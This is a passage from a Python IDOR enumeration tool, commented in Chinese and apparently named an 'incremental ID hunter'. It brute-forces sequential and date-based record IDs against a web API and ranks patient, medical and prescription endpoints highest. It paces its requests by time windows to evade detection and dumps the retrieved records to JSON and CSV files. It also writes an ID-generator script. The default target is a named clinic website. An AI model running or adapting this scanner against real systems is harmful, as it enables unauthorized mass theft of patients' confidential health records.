    def _calculate_task_priority(self, id_type: str, endpoint_pattern: str, id_val: str) -> float:
        """计算任务优先级"""
        base_priority = 0.5
        
        # ID类型优先级
        type_priorities = {
            'patient': 0.9,
            'medical': 0.8,
            'appointment': 0.7,
            'prescription': 0.7,
            'snowflake': 0.6,
            'date_based': 0.6,
            'composite': 0.5,
            'numeric': 0.4
        }
        
        # 检查ID类型
        for type_key, priority in type_priorities.items():
            if type_key in id_type.lower():
                base_priority = priority
                break
        
        # 关联ID优先级加成
        if 'correlated' in id_type:
            base_priority += 0.2
        
        # 端点模式优先级
        if 'patient' in endpoint_pattern.lower():
            base_priority += 0.1
        elif 'medical' in endpoint_pattern.lower():
            base_priority += 0.1
        
        return min(base_priority, 1.0)
    
    def _get_correlation_strength(self, id_type: str) -> float:
        """获取关联强度"""
        if 'correlated' in id_type:
            return 0.8
        elif id_type in ['patient', 'medical']:
            return 0.6
        else:
            return 0.3
    
    async def _execute_priority_task_queue(self):
        """执行优先级任务队列 - 应用时间窗口优化"""
        logger.info("[+] 开始执行智能优先级任务队列...")
        
        processed_count = 0
        skipped_count = 0
        max_workers = self.adaptive_concurrency.current_concurrency
        
        # 创建工作协程
        async def worker():
            nonlocal processed_count, skipped_count
            
            while not self.priority_queue.empty():
                # 获取高优先级任务
                task = await self.priority_queue.get()
                if not task:
                    break
                
                # 应用时间窗口优化
                if hasattr(self, 'time_strategy') and self.time_strategy:
                    if self._should_skip_task_by_time(task):
                        skipped_count += 1
                        logger.debug(f"根据时间窗口优化跳过任务: {task.id_value}")
                        continue
                    
                    # 根据时间窗口调整任务优先级
                    task.priority = self._adjust_task_priority_by_time(task)
                
                try:
                    # 自适应并发控制
                    await self.adaptive_concurrency.acquire()
                    
                    start_time = time.time()
                    
                    # 应用时间窗口延迟策略
                    delay = self._calculate_time_based_delay()
                    if delay > 0:
                        await asyncio.sleep(delay)
                    
                    # 执行任务
                    result = await self._execute_single_task(task)
                    
                    response_time = time.time() - start_time
                    success = result is not None
                    
                    # 记录性能
                    await self.adaptive_concurrency.record_performance(response_time, success)
                    self.priority_queue.update_task_performance(task.endpoint_pattern, response_time, success)
                    
                    if result:
                        # 过滤噪音
                        if self._filter_data_noise(result):
                            self.extracted_data.append(result)
                            processed_count += 1
                            
                            # 学习成功关联
                            if 'correlated' in task.metadata.get('id_type', ''):
                                self.id_correlator.learn_correlation_from_success(
                                    task.metadata.get('source_id', ''),
                                    task.endpoint_pattern,
                                    task.id_value
                                )
                    
                    # 释放并发许可
                    self.adaptive_concurrency.release()
                    
                    # 检查是否达到数据限制
                    if len(self.extracted_data) >= self.config.max_extracted_data:
                        logger.info("[*] 达到数据提取限制，停止任务")
                        break
                        
                except Exception as e:
                    logger.debug(f"任务执行异常: {e}")
                    self.adaptive_concurrency.release()
                
                # 时间窗口优化的动态延迟
                adaptive_delay = self._calculate_adaptive_delay()
                await asyncio.sleep(adaptive_delay)
        
        # 启动工作协程
        workers = [asyncio.create_task(worker()) for _ in range(min(max_workers, 10))]
        
        # 等待所有工作完成
        await asyncio.gather(*workers, return_exceptions=True)
        
        logger.info(f"[+] 任务队列执行完成，处理了 {processed_count} 个任务")
        if skipped_count > 0:
            logger.info(f"[+] 时间窗口优化跳过了 {skipped_count} 个低效任务")
            logger.info(f"[+] 优化效率: {skipped_count/(processed_count+skipped_count)*100:.1f}% 任务被智能跳过")
        
        # 打印性能统计
        perf_metrics = self.adaptive_concurrency.get_performance_metrics()
        logger.info(f"[*] 最终并发数: {perf_metrics['current_concurrency']}")
        logger.info(f"[*] 平均响应时间: {perf_metrics.get('avg_response_time', 0):.2f}秒")
        
        queue_stats = self.priority_queue.get_queue_stats()
        logger.info(f"[*] 队列统计: {queue_stats['priority_distribution']}")
    
    def _should_skip_task_by_time(self, task: IDTask) -> bool:
        """根据时间窗口策略判断是否跳过任务"""
        if not hasattr(self, 'time_strategy') or not self.time_strategy:
            return False
        
        current_hour = datetime.now().hour
        current_weekday = datetime.now().strftime('%A')
        
        # 检查是否在避免时间段
        skip_hours = self.time_strategy.get('skip_hours', [])
        if skip_hours and current_hour in skip_hours:
            # 对于低优先级任务，在避免时间段直接跳过
            if task.priority < 0.6:
                return True
        
        # 检查工作日偏好
        weekday_preferences = self.time_strategy.get('weekday_preferences', [])
        if weekday_preferences and current_weekday not in weekday_preferences:
            # 对于低优先级任务，在非偏好工作日跳过
            if task.priority < 0.7:
                return True
        
        return False
    
    def _adjust_task_priority_by_time(self, task: IDTask) -> float:
        """根据时间窗口调整任务优先级"""
        if not hasattr(self, 'time_strategy') or not self.time_strategy:
            return task.priority
        
        current_hour = datetime.now().hour
        current_weekday = datetime.now().strftime('%A')
        
        adjusted_priority = task.priority
        
        # 优先时间段加分
        priority_hours = self.time_strategy.get('priority_hours', [])
        if priority_hours and current_hour in priority_hours:
            adjusted_priority += 0.1
        
        # 工作日偏好加分
        weekday_preferences = self.time_strategy.get('weekday_preferences', [])
        if weekday_preferences and current_weekday in weekday_preferences:
            adjusted_priority += 0.05
        
        return min(adjusted_priority, 1.0)
    
    def _calculate_time_based_delay(self) -> float:
        """计算基于时间窗口的延迟"""
        if not hasattr(self, 'time_strategy') or not self.time_strategy:
            return 0.0
        
        current_hour = datetime.now().hour
        
        # 在避免时间段增加延迟
        skip_hours = self.time_strategy.get('skip_hours', [])
        if skip_hours and current_hour in skip_hours:
            return 0.5  # 增加0.5秒延迟
        
        # 在优先时间段减少延迟
        priority_hours = self.time_strategy.get('priority_hours', [])
        if priority_hours and current_hour in priority_hours:
            return 0.01  # 减少到0.01秒延迟
        
        return 0.1  # 默认延迟
    
    def _calculate_adaptive_delay(self) -> float:
        """计算自适应延迟"""
        base_delay = 0.01
        
        # 根据当前性能调整延迟
        perf_metrics = self.adaptive_concurrency.get_performance_metrics()
        
        if 'avg_response_time' in perf_metrics:
            avg_time = perf_metrics['avg_response_time']
            
            # 如果响应时间过长，增加延迟
            if avg_time > 2.0:
                base_delay *= 2.0
            elif avg_time < 0.5:
                base_delay *= 0.5
        
        # 根据错误率调整延迟
        if 'error_rate' in perf_metrics and perf_metrics['error_rate'] > 0.1:
            base_delay *= 1.5
        
        return min(base_delay, 1.0)  # 最大1秒延迟
    
    async def _execute_single_task(self, task: IDTask) -> Optional[Dict[str, Any]]:
        """执行单个任务"""
        url = task.metadata['url']
        
        response = await self._safe_request(url, timeout=aiohttp.ClientTimeout(total=5))
        if not response:
            return None
        
        try:
            # WAF验证
            if not await self._validate_response_with_waf(url, response):
                return None
            
            if response.status == 200:
                try:
                    content_type = response.headers.get('content-type', '').lower()
                    
                    if 'application/json' in content_type:
                        data = await response.json()
                        
                        # 检查是否包含有效数据
                        if isinstance(data, dict) and len(data) > 1:
                            result = {
                                'id': task.id_value,
                                'endpoint': task.endpoint_pattern,
                                'data': data,
                                'timestamp': datetime.now().isoformat(),
                                'url': url,
                                'content_type': content_type,
                                'task_priority': task.priority,
                                'id_type': task.metadata.get('id_type', 'unknown')
                            }
                            return result
                    else:
                        # 可能不是JSON
                        content = await response.text()
                        if len(content) > 50:
                            result = {
                                'id': task.id_value,
                                'endpoint': task.endpoint_pattern,
                                'content': content[:500],
                                'timestamp': datetime.now().isoformat(),
                                'url': url,
                                'content_type': content_type,
                                'task_priority': task.priority,
                                'id_type': task.metadata.get('id_type', 'unknown')
                            }
                            return result
                except Exception as e:
                    logger.debug(f"数据解析异常: {e}")
                    
        except Exception as e:
            logger.debug(f"任务执行异常: {e}")
        finally:
            if hasattr(response, 'close'):
                response.close()
        
        return None
    
    def _learn_successful_correlations(self):
        """学习成功的关联"""
        logger.info("[+] 学习成功的ID关联模式...")
        
        # 分析成功提取的数据中的ID模式
        successful_ids = []
        for record in self.extracted_data:
            if 'id' in record:
                successful_ids.append(record['id'])
        
        if len(successful_ids) >= 5:
            # 更新高级ID识别器的学习模型
            learned_patterns = self.advanced_id_recognizer.format_learner.learn_from_successful_ids(successful_ids)
            
            if learned_patterns:
                logger.info(f"[+] 学习到 {learned_patterns.get('clusters_found', 0)} 个新格式模式")
                logger.info(f"[+] 学习置信度: {learned_patterns.get('learning_confidence', 0):.2f}")
        
        # 打印关联统计
        correlation_stats = self.id_correlator.get_correlation_stats()
        if correlation_stats['learned_correlations'] > 0:
                            logger.info(f"[+] 学习到的关联类型: {correlation_stats['correlation_types']}")

    def _analyze_composite_formats(self, ids):
        """分析复合格式ID"""
        composite_patterns = defaultdict(list)
        
        for id_val in ids:
            id_str = str(id_val)
            
            # 匹配前缀+数字
            match = re.match(r'^([A-Z]+)(\d+)$', id_str, re.I)
            if match:
                prefix = match.group(1).upper()
                number = int(match.group(2))
                
                composite_patterns[prefix].append({
                    'number': number,
                    'length': len(match.group(2)),
                    'full_id': id_str
                })
                
        if composite_patterns:
            # 分析每个前缀
            results = {}
            
            for prefix, patterns in composite_patterns.items():
                if len(patterns) >= 2:
                    numbers = [p['number'] for p in patterns]
                    lengths = [p['length'] for p in patterns]
                    
                    # 最常见的长度
                    common_length = max(set(lengths), key=lengths.count)
                    
                    results[prefix] = {
                        'prefix': prefix,
                        'number_length': common_length,
                        'min_number': min(numbers),
                        'max_number': max(numbers),
                        'sample': [p['full_id'] for p in patterns[:3]]
                    }
                    
            if results:
                return {
                    'type': 'composite',
                    'patterns': results
                }
                
        return None

    def _merge_pattern_info(self, pattern_type: str, new_pattern_info: Dict[str, Any]):
        """合并模式信息"""
        existing_info = self.advanced_id_recognizer.dynamic_formats.get(pattern_type, {})
        
        # 简单合并策略
        if 'sample' in new_pattern_info and 'sample' in existing_info:
            # 合并样本，去重
            combined_samples = list(set(existing_info['sample'] + new_pattern_info['sample']))
            new_pattern_info['sample'] = combined_samples[:10]  # 限制样本数量
        
        self.advanced_id_recognizer.dynamic_formats[pattern_type] = new_pattern_info

    async def query_single_id(self, url, id_val, endpoint_pattern):
        """查询单个ID"""
        response = await self._safe_request(url, timeout=aiohttp.ClientTimeout(total=5))
        if not response:
            return None
        
        try:
            # WAF验证
            if not await self._validate_response_with_waf(url, response):
                return None
            
            if response.status == 200:
                try:
                    content_type = response.headers.get('content-type', '').lower()
                    
                    if 'application/json' in content_type:
                        data = await response.json()
                        
                        # 检查是否包含有效数据
                        if isinstance(data, dict) and len(data) > 1:  # 不只是错误信息
                            result = {
                                'id': id_val,
                                'endpoint': endpoint_pattern,
                                'data': data,
                                'timestamp': datetime.now().isoformat(),
                                'url': url,
                                'content_type': content_type
                            }
                            return result
                    else:
                        # 可能不是JSON
                        content = await response.text()
                        if len(content) > 50:  # 有实质内容
                            result = {
                                'id': id_val,
                                'endpoint': endpoint_pattern,
                                'content': content[:500],
                                'timestamp': datetime.now().isoformat(),
                                'url': url,
                                'content_type': content_type
                            }
                            return result
                except Exception as e:
                    logger.debug(f"数据解析异常: {e}")
                    
        except Exception as e:
            logger.debug(f"查询异常: {e}")
        finally:
            if hasattr(response, 'close'):
                response.close()
        
        return None

    def generate_report(self):
        """生成报告"""
        # 性能统计
        performance_stats = self.metrics.get_stats()
        
        # 获取所有优化组件的统计
        adaptive_concurrency_stats = self.adaptive_concurrency.get_performance_metrics()
        priority_queue_stats = self.priority_queue.get_queue_stats()
        correlation_stats = self.id_correlator.get_correlation_stats()
        
        report = {
            'target': self.target_url,
            'scan_time': datetime.now().isoformat(),
            'configuration': self.config.get_config(),
            'id_patterns': self.id_patterns,
            'discovered_endpoints': list(set(self.id_endpoints)),
            'total_extracted': len(self.extracted_data),
            'sample_data': self.extracted_data[:10],  # 保存样本
            'performance': performance_stats,
            'waf_statistics': self.waf_stats,
            'noise_statistics': self.noise_stats,
            
            # 新增的核心优化统计
            'advanced_features': {
                'adaptive_concurrency': {
                    'enabled': True,
                    'final_concurrency': adaptive_concurrency_stats.get('current_concurrency', 0),
                    'avg_response_time': adaptive_concurrency_stats.get('avg_response_time', 0),
                    'p95_response_time': adaptive_concurrency_stats.get('p95_response_time', 0),
                    'throughput_trend': adaptive_concurrency_stats.get('throughput_trend', [])
                },
                'priority_queue': {
                    'enabled': True,
                    'total_processed': priority_queue_stats.get('priority_distribution', {}).get('total_processed', 0),
                    'high_priority_ratio': priority_queue_stats.get('priority_distribution', {}).get('high_priority_count', 0) / max(priority_queue_stats.get('priority_distribution', {}).get('total_processed', 1), 1),
                    'endpoint_performance': priority_queue_stats.get('endpoint_performance', {})
                },
                'id_correlation': {
                    'enabled': True,
                    'learned_correlations': correlation_stats.get('learned_correlations', 0),
                    'correlation_types': correlation_stats.get('correlation_types', []),
                    'confidence_scores': correlation_stats.get('confidence_scores', {}),
                    'total_samples': correlation_stats.get('total_correlation_samples', 0)
                },
                'advanced_id_recognition': {
                    'enabled': True,
                    'dynamic_patterns': len(self.advanced_id_recognizer.dynamic_formats),
                    'success_patterns': dict(self.advanced_id_recognizer.success_patterns),
                    'recognition_history_size': len(self.advanced_id_recognizer.recognition_history)
                },
                'form_extraction': {
                    'enabled': hasattr(self, 'form_extractor'),
                    'extraction_stats': self.form_extractor.extraction_stats if hasattr(self, 'form_extractor') else {}
                },
                'time_window_optimization': {
                    'enabled': hasattr(self, 'time_window_optimizer'),
                    'optimal_windows': getattr(self.time_window_optimizer, 'optimal_windows', {}) if hasattr(self, 'time_window_optimizer') else {}
                }
            },
            
            'security_features': {
                'waf_protection': WAF_DEFENDER_AVAILABLE and self.config.enable_waf_protection,
                'noise_filtering': NOISE_FILTER_AVAILABLE and self.config.enable_noise_filtering,
                'smart_limits': SMART_LIMITS_AVAILABLE and self.config.enable_smart_limits
            },
            
            # 优化效果分析
            'optimization_impact': {
                'estimated_efficiency_gain': self._calculate_optimization_impact(),
                'data_quality_score': self._calculate_data_quality_score(),
                'coverage_completeness': self._calculate_coverage_completeness()
            }
        }
        
        # 保存完整数据
        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
        
        try:
            # JSON报告
            report_file = f"incremental_id_report_{timestamp}.json"
            with open(report_file, 'w', encoding='utf-8') as f:
                json.dump(report, f, ensure_ascii=False, indent=2)
                
            # 提取的数据
            if self.extracted_data:
                data_file = f"incremental_id_data_{timestamp}.json"
                with open(data_file, 'w', encoding='utf-8') as f:
                    json.dump(self.extracted_data, f, ensure_ascii=False, indent=2)
                    
                # CSV格式
                import csv
                csv_file = f"incremental_id_data_{timestamp}.csv"
                
                # 收集所有字段
                all_fields = set(['id', 'endpoint', 'url', 'timestamp'])
                for record in self.extracted_data:
                    if 'data' in record and isinstance(record['data'], dict):
                        all_fields.update(record['data'].keys())
                        
                with open(csv_file, 'w', newline='', encoding='utf-8-sig') as f:
                    writer = csv.DictWriter(f, fieldnames=list(all_fields))
                    writer.writeheader()
                    
                    for record in self.extracted_data:
                        row = {
                            'id': record.get('id', ''),
                            'endpoint': record.get('endpoint', ''),
                            'url': record.get('url', ''),
                            'timestamp': record.get('timestamp', '')
                        }
                        if 'data' in record and isinstance(record['data'], dict):
                            row.update(record['data'])
                        writer.writerow(row)
                        
                logger.info(f"[+] CSV数据: {csv_file}")
                
            # 生成ID生成脚本
            if self.id_patterns:
                script_file = f"id_generator_{timestamp}.py"
                with open(script_file, 'w') as f:
                    f.write("#!/usr/bin/env python3\n")
                    f.write("# ID生成脚本\n\n")
                    f.write("import datetime\n\n")
                    
                    f.write("# 发现的ID模式\n")
                    f.write(f"patterns = {json.dumps(self.id_patterns, indent=2)}\n\n")
                    
                    f.write("# 生成ID的函数\n")
                    f.write("def generate_ids():\n")
                    f.write("    ids = []\n")
                    
                    for pattern_type, pattern_info in self.id_patterns.items():
                        if pattern_type == 'date_based' and 'sequence_length' in pattern_info:
                            f.write(f"    # 日期格式ID\n")
                            f.write(f"    today = datetime.datetime.now()\n")
                            f.write(f"    for days in range(30):\n")
                            f.write(f"        date = today - datetime.timedelta(days=days)\n")
                            f.write(f"        date_str = date.strftime('%Y%m%d')\n")
                            f.write(f"        for seq in range(1, 100):\n")
                            f.write(f"            ids.append(date_str + str(seq).zfill({pattern_info['sequence_length']}))\n")
                            
                    f.write("    return ids\n\n")
                    f.write("if __name__ == '__main__':\n")
                    f.write("    ids = generate_ids()\n")
                    f.write("    print(f'生成 {len(ids)} 个ID')\n")
                    f.write("    print('前10个:', ids[:10])\n")
                    
                logger.info(f"[+] ID生成器: {script_file}")
                
            logger.info(f"\n[+] 增量ID分析完成!")
            logger.info(f"[+] 发现模式: {len(self.id_patterns)}")
            logger.info(f"[+] 提取数据: {len(self.extracted_data)}")
            logger.info(f"[+] 报告文件: {report_file}")
            
            # 打印性能统计
            logger.info(f"\n[*] 性能统计:")
            logger.info(f"    总请求数: {performance_stats['total_requests']}")
            logger.info(f"    成功率: {performance_stats['success_rate']:.2%}")
            logger.info(f"    平均响应时间: {performance_stats['avg_response_time']:.2f}秒")
            logger.info(f"    请求速率: {performance_stats['requests_per_second']:.2f} req/s")
            
            # WAF统计
            if self.waf_stats['total_validations'] > 0:
                logger.info(f"\n[*] WAF防护统计:")
                logger.info(f"    总验证次数: {self.waf_stats['total_validations']}")
                logger.info(f"    检测到欺骗: {self.waf_stats['waf_detected']}")
                logger.info(f"    真实响应: {self.waf_stats['real_responses']}")
            
            # 噪音过滤统计
            if self.noise_stats['total_checked'] > 0:
                filter_rate = self.noise_stats['filtered_out'] / self.noise_stats['total_checked']
                logger.info(f"\n[*] 噪音过滤统计:")
                logger.info(f"    检查项目: {self.noise_stats['total_checked']}")
                logger.info(f"    过滤率: {filter_rate:.2%}")
                logger.info(f"    有价值发现: {self.noise_stats['valuable_findings']}")
            
            # 打印ID模式摘要
            if self.id_patterns:
                logger.info("\n[!] 发现的ID模式:")
                for pattern_type, info in self.id_patterns.items():
                    sample = info.get('sample', [])
                    if sample:
                        logger.info(f"    {pattern_type}: {sample[:3]}...")
                    
            # 数据统计
            if self.extracted_data:
                endpoint_stats = defaultdict(int)
                for record in self.extracted_data:
                    endpoint_stats[record.get('endpoint', 'unknown')] += 1
                    
                logger.info("\n[!] 数据分布:")
                for endpoint, count in endpoint_stats.items():
                    logger.info(f"    {endpoint}: {count} 条")
                    
        except Exception as e:
            logger.error(f"报告生成异常: {e}")
            
        return report

    def _calculate_optimization_impact(self) -> Dict[str, Any]:
        """计算优化影响"""
        impact = {
            'concurrency_optimization': 0,
            'priority_optimization': 0,
            'correlation_optimization': 0,
            'overall_impact': 0
        }
        
        # 自适应并发优化影响
        concurrency_stats = self.adaptive_concurrency.get_performance_metrics()
        if 'avg_response_time' in concurrency_stats and concurrency_stats['avg_response_time'] > 0:
            # 假设没有优化的基准响应时间是当前的1.5倍
            baseline_time = concurrency_stats['avg_response_time'] * 1.5
            improvement = (baseline_time - concurrency_stats['avg_response_time']) / baseline_time
            impact['concurrency_optimization'] = min(improvement * 100, 50)  # 最多50%提升
        
        # 优先级队列优化影响
        queue_stats = self.priority_queue.get_queue_stats()
        total_processed = queue_stats.get('priority_distribution', {}).get('total_processed', 0)
        high_priority = queue_stats.get('priority_distribution', {}).get('high_priority_count', 0)
        
        if total_processed > 0:
            high_priority_ratio = high_priority / total_processed
            impact['priority_optimization'] = high_priority_ratio * 30  # 高优先级比例越高，优化效果越好
        
        # 关联优化影响
        correlation_stats = self.id_correlator.get_correlation_stats()
        if correlation_stats.get('learned_correlations', 0) > 0:
            # 关联发现可以减少盲目搜索
            correlation_impact = min(correlation_stats['learned_correlations'] * 5, 25)  # 最多25%提升
            impact['correlation_optimization'] = correlation_impact
        
        # 总体影响
        impact['overall_impact'] = (
            impact['concurrency_optimization'] + 
            impact['priority_optimization'] + 
            impact['correlation_optimization']
        ) / 3
        
        return impact
    
    def _calculate_data_quality_score(self) -> float:
        """计算数据质量分数"""
        if not self.extracted_data:
            return 0.0
        
        quality_factors = []
        
        # 1. 数据完整性 - 有多少数据包含完整的JSON结构
        complete_data_count = sum(1 for record in self.extracted_data 
                                if 'data' in record and isinstance(record['data'], dict) and len(record['data']) > 3)
        completeness_score = complete_data_count / len(self.extracted_data)
        quality_factors.append(completeness_score)
        
        # 2. 数据多样性 - ID类型的多样性
        id_types = set()
        for record in self.extracted_data:
            if 'id_type' in record:
                id_types.add(record['id_type'])
        diversity_score = min(len(id_types) / 5.0, 1.0)  # 5种类型为满分
        quality_factors.append(diversity_score)
        
        # 3. 噪音过滤效果
        if self.noise_stats['total_checked'] > 0:
            noise_filter_score = 1.0 - (self.noise_stats['filtered_out'] / self.noise_stats['total_checked'])
            # 过滤掉适量噪音是好的，过滤太多可能丢失有用数据
            if 0.1 <= noise_filter_score <= 0.8:
                quality_factors.append(1.0)
            else:
                quality_factors.append(0.5)
        else:
            quality_factors.append(0.5)
        
        # 4. WAF检测准确性
        if self.waf_stats['total_validations'] > 0:
            waf_accuracy = self.waf_stats['real_responses'] / self.waf_stats['total_validations']
            quality_factors.append(waf_accuracy)
        else:
            quality_factors.append(1.0)  # 没有WAF检测时假设100%准确
        
        return statistics.mean(quality_factors)
    
    def _calculate_coverage_completeness(self) -> Dict[str, Any]:
        """计算覆盖完整性"""
        coverage = {
            'id_pattern_coverage': 0,
            'endpoint_coverage': 0,
            'medical_system_coverage': 0,
            'overall_coverage': 0
        }
        
        # ID模式覆盖率
        expected_patterns = ['numeric', 'date_based', 'composite', 'medical', 'snowflake']
        found_patterns = list(self.id_patterns.keys())
        pattern_overlap = len(set(found_patterns) & set(expected_patterns))
        coverage['id_pattern_coverage'] = pattern_overlap / len(expected_patterns)
        
        # 端点覆盖率
        if self.id_endpoints:
            medical_endpoints = sum(1 for ep in self.id_endpoints 
                                  if any(keyword in ep.lower() for keyword in ['patient', 'medical', 'appointment', 'prescription']))
            coverage['endpoint_coverage'] = len(self.id_endpoints) / 20  # 假设20个端点为完整覆盖
            coverage['medical_system_coverage'] = medical_endpoints / max(len(self.id_endpoints), 1)
        
        # 总体覆盖率
        coverage['overall_coverage'] = statistics.mean([
            coverage['id_pattern_coverage'],
            min(coverage['endpoint_coverage'], 1.0),
            coverage['medical_system_coverage']
        ])
        
        return coverage

async def main():
    """主函数"""
    import sys
    
    if len(sys.argv) > 1:
        target = sys.argv[1]
    else:
        target = input("请输入目标URL [默认: https://asanoha-clinic.com]: ").strip()
        if not target:
            target = "https://asanoha-clinic.com"
    
    # 确保URL格式正确
    if not target.startswith(('http://', 'https://')):
        target = 'https://' + target
        
    # 可以传入已知的端点
    known_endpoints = []
    if len(sys.argv) > 2:
        known_endpoints = sys.argv[2].split(',')
    
    # 创建配置
    config = IDHunterConfig()
    
    # 认证配置示例（可根据需要修改）
    # 示例1: 用户名密码登录
    # config.enable_authentication = True
    # config.auth_config = {
    #     'login_url': f'{target}/login',
    #     'username': 'admin',
    #     'password': 'password123'
    # }
    
    # 示例2: 直接使用JWT token
    # config.enable_authentication = True
    # config.auth_config = {
    #     'jwt_token': 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...'
    # }
    
    # 示例3: 使用API key
    # config.enable_authentication = True
    # config.auth_config = {
    #     'api_key': 'sk-1234567890abcdef',
    #     'api_key_header': 'X-API-Key'
    # }
    
    # 从命令行参数调整配置
    if len(sys.argv) > 3:
        try:
            config.max_concurrent_requests = int(sys.argv[3])
        except (ValueError, IndexError):
            pass
    
    logger.info(f"[*] 启动增量ID猎手")
    logger.info(f"[*] 目标: {target}")
    logger.info(f"[*] 已知端点: {len(known_endpoints)}")
    
    try:
        hunter = IncrementalIDHunter(target, known_endpoints, config)
        results = await hunter.run()
        
        logger.info(f"\n[+] 扫描完成！")
        logger.info(f"[+] 提取到 {len(results)} 条数据")
        
        return results
        
    except KeyboardInterrupt:
        logger.info("\n[!] 用户中断扫描")
    except Exception as e:
        logger.error(f"\n[!] 扫描异常: {e}")
        raise

if __name__ == "__main__":
    asyncio.run(main())